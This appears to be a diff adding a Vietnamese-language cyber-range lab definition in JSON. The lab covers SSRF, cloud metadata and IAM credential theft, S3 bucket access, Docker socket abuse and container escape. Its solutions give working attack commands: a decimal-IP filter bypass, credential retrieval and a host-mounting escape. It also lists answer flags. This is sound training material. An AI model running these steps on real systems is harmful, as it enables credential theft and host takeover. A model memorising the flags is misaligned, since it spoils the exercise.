@@ -1,0 +1,285 @@
+{
+  "title": "LAB 5 — Khai thác SSRF trên Cloud và Thoát khỏi Container",
+  "description": "Bài thực hành mô phỏng khai thác SSRF, truy cập Cloud Metadata (IMDS), đánh cắp thông tin IAM, truy cập MinIO (S3), khai thác Docker Socket và Container Escape.",
+  "prerequisites": [
+    "Kiến thức cơ bản về Linux",
+    "Hiểu giao thức HTTP",
+    "Kiến thức cơ bản về AWS CLI và Docker"
+  ],
+  "outcomes": [
+    "Khai thác lỗ hổng SSRF",
+    "Truy cập dịch vụ Cloud Metadata",
+    "Khai thác thông tin xác thực IAM",
+    "Truy cập kho lưu trữ MinIO tương thích S3",
+    "Khai thác Docker Socket",
+    "Thực hiện Container Escape"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Giới thiệu",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# LAB 5 — Cloud SSRF & Container Escape\n\nBạn sẽ bắt đầu trên máy **attacker**. Ứng dụng ImageResizer chạy tại `http://172.20.0.10:5000/` trong một môi trường huấn luyện được cô lập và cố ý chứa lỗ hổng."
+    },
+    {
+      "title": "Khởi tạo môi trường",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Đăng nhập vào **attacker** bằng tài khoản `user` / `Password123`, kiểm tra truy cập tới `http://172.20.1.10:5000/` rồi nộp `start`.",
+      "local_content": "Kết nối tới máy thực hành và nộp `start`."
+    },
+    {
+      "title": "Level 1 - Phát hiện SSRF",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{5SRF_c0nf1rm3d}",
+      "answer_variable_name": null,
+      "content": "Lợi dụng chức năng **Upload from URL** của ImageResizer để yêu cầu ứng dụng truy cập `http://127.0.0.1:8080/admin`. Xác định giá trị của header `X-Admin-Panel` và nộp đáp án.",
+      "solution": "Dùng `curl -i -X POST http://172.20.1.10:5000/fetch --data-urlencode 'url=http://127.0.0.1:8080/admin'`. Đáp án: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Quan sát Response Header",
+          "content": "Sử dụng `curl -i` hoặc Burp Suite.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0001.T1190"
+        }
+      ],
+      "expected_commands": [
+        "curl"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Level 2 - Truy cập Cloud Metadata",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{i-0abc123def456}",
+      "answer_variable_name": null,
+      "content": "Khai thác SSRF để truy cập `/latest/meta-data/instance-id`. Nếu địa chỉ 169.254.169.254 bị chặn, hãy thử các kỹ thuật bypass như địa chỉ IPv4 dạng số nguyên.",
+      "solution": "Use decimal IPv4 `2852039166`: `http://2852039166/latest/meta-data/instance-id`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Weak filter",
+          "content": "Only the literal hostname is blocked.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1552"
+        }
+      ],
+      "expected_commands": [
+        "curl"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Level 3 - Đánh cắp thông tin IAM",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{AKIA1MDSL34K3D01}",
+      "answer_variable_name": null,
+      "content": "Xác định tên IAM Role, sau đó lấy thông tin xác thực (AccessKeyId, SecretAccessKey và Token). Nộp AccessKeyId theo định dạng yêu cầu.",
+      "solution": "Request `/latest/meta-data/iam/security-credentials/`, then append the returned role. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Role first",
+          "content": "Enumerate the role before requesting credentials.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1552"
+        }
+      ],
+      "expected_commands": [
+        "curl",
+        "jq"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Level 4 - Truy cập MinIO (S3)",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{backup-2024-11-30.tar.gz}",
+      "answer_variable_name": null,
+      "content": "Sử dụng thông tin IAM đã thu được để truy cập MinIO, liệt kê bucket `techcorp-backups` và xác định file backup mới nhất.",
+      "solution": "Export access key and secret, `unset AWS_SESSION_TOKEN`, then run `aws s3 ls ... --endpoint-url http://172.20.1.30:9000`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Custom endpoint",
+          "content": "Use `--endpoint-url`.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1530"
+        }
+      ],
+      "expected_commands": [
+        "aws",
+        "export",
+        "unset"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Level 5 - Khai thác Docker Socket",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{Docker_24.0.5}",
+      "answer_variable_name": null,
+      "content": "Tải backup mới nhất, tìm SSH key, đăng nhập vào docker-host và truy vấn Docker API thông qua `/var/run/docker.sock`.",
+      "solution": "Extract the archive, read `notes.txt`, `chmod 600` the key, SSH in, then run `curl --unix-socket /var/run/docker.sock http://localhost/version | jq -r .Version`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Read notes",
+          "content": "The archive contains target, port, user, and key.",
+          "hint_penalty": 20,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1552"
+        }
+      ],
+      "expected_commands": [
+        "aws",
+        "tar",
+        "chmod",
+        "ssh",
+        "curl",
+        "jq"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Level 6 - Thoát khỏi Container",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{c0nt41n3r_3sc4p3_v14_s0ck3t}",
+      "answer_variable_name": null,
+      "content": "Sử dụng Docker Socket để tạo container mới, mount filesystem của host và đọc nội dung `/root/flag.txt`.",
+      "solution": "Run `docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine:3.19 chroot /host cat /root/flag.txt`. Answer: `${ANSWER}`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Mount host root",
+          "content": "Bind mount `/` at `/host`.",
+          "hint_penalty": 30,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 200,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0004.T1611"
+        }
+      ],
+      "expected_commands": [
+        "docker",
+        "chroot",
+        "cat"
+      ],
+      "commands_required": true
+    },
+    {
+      "title": "Kiểm tra kiến thức",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 8,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "Vì sao quyền truy cập `docker.sock` gần như tương đương quyền root trên máy host?",
+          "points": 100,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "Có thể tạo container với bind mount tùy ý lên host.",
+              "correct": true,
+              "order": 0
+            },
+            {
+              "text": "Có thể xem toàn bộ mật khẩu của hệ thống.",
+              "correct": false,
+              "order": 1
+            }
+          ]
+        }
+      ],
+      "instructions": "Hoàn thành các câu hỏi đánh giá sau khi kết thúc bài thực hành.",
+      "assessment_type": "TEST"
+    }
+  ],
+  "estimated_duration": 100,
+  "variant_sandboxes": false
+}
